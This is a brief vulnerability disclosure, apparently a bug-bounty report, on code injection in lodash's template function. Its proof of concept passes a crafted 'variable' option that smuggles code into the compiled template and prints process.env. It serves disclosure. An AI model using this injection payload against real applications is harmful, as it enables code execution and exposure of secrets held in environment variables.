# Description

Command Injection in lodash

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var lodash = require('lodash');

lodash.template('', { variable: '){console.log(process.env)}; with(obj' })()
```

2. Execute the following commands in terminal:

```
npm i lodash # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output.
